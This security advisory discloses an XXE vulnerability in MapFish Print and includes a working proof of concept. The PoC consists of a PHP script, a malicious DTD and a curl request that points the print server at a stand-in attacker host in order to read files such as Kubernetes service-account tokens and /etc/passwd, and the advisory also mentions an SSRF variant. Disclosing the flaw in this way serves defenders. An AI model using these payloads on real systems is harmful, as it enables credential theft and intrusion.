summary: "MapFish Print has XXE that allows reading arbitrary files of certain types\n### Summary\n\
  XXE on MapFish Print allows reading arbitrary files of certain types. Eg /etc/passwd or k8\
  \ secrets and certs.\n\nhttps://github.com/mapfish/mapfish-print/commit/13020c0fbc299e5f604e4e66066311c4bf04d507\n\
  \n### Details\nTo trigger the XXE it is required to host a remote script and dtd file. When\
  \ using the Print feature its possible to send the attacker server url as url of the gml layer.\n\
  \nThe 404 not found path when using the gml Layer will expand the content of the file as path\
  \ and throw a default 404 with the full content as path.\n\n### PoC\nHost this php file somewhere\
  \ as xxe.php:\n\n```\n<?php\n$p=$_GET['p'];\n$d=dirname($_SERVER['SCRIPT_NAME']);\n$u=(empty($_SERVER['HTTPS'])?'http':'https').\"\
  ://{$_SERVER['HTTP_HOST']}$d/evil.dtd\";\nheader('Content-Type: application/xml');\necho \"\
  <?xml version=\\\"1.0\\\"?>\n<!DOCTYPE x [\n <!ENTITY % payload SYSTEM \\\"file://$p\\\">\n\
  \ <!ENTITY % dtd SYSTEM \\\"$u\\\">\n %dtd;\n]>\n<wfs:FeatureCollection xmlns:wfs=\\\"http://www.opengis.net/wfs\\\
  \" xmlns:gml=\\\"http://www.opengis.net/gml\\\">\n<!-- \".str_repeat('x',200).\" -->\n<gml:boundedBy><gml:null>unknown</gml:null></gml:boundedBy>\n\
  </wfs:FeatureCollection>\";\n```\n\nand beneath host this \"evil.dtd\"\n\n`<!ENTITY % exfil\
  \ \"<!ENTITY &#37; error SYSTEM 'file:///xxe-exfil/%payload;'>\">\n%exfil;\n%error;`\n\nNow\
  \ send a single curl request against your mapfish print server and include your hosted poc\
  \ url as gml layer url with the path attached you would like to exfil. It will exfil /var/run/secrets/kubernetes.io/serviceaccount/token\
  \ (most likely your local test setup wont have it, then just replace the path with /etc/passwd\
  \ or similar plain files)\n\n`curl -sk 'https://mapfish/api/print3/print/mapviewer/buildreport.pdf'\
  \ \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"layout\":\"1. A4 landscape\",\"attributes\"\
  :{\"printDate\":\"a\",\"url\":\"\",\"copyright\":\"\",\"qrimage\":\"\",\"map\":{\"projection\"\
  :\"EPSG:2056\",\"rotation\":0,\"dpi\":96,\"center\":[2600000,1200000],\"scale\":100000,\"\
  layers\":[{\"type\":\"gml\",\"url\":\"https://attacker.ch/xxe.php?p=/var/run/secrets/kubernetes.io/serviceaccount/token\"\
  }]}},\"outputFormat\":\"pdf\"}'`\n\nIts also noteworthy that when you use just a path with\
  \ slash in the end /tmp/ for example - it will literally list the files and output this for\
  \ you.\n\nIt is actually also possible to trigger an SSRF and request internal URLs if you'd\
  \ change the file:// prefix in the dtd to https:// \n\n### Impact\ndisclose local files. blind(ish)\
  \ SSRF (depends on the servers response data)"
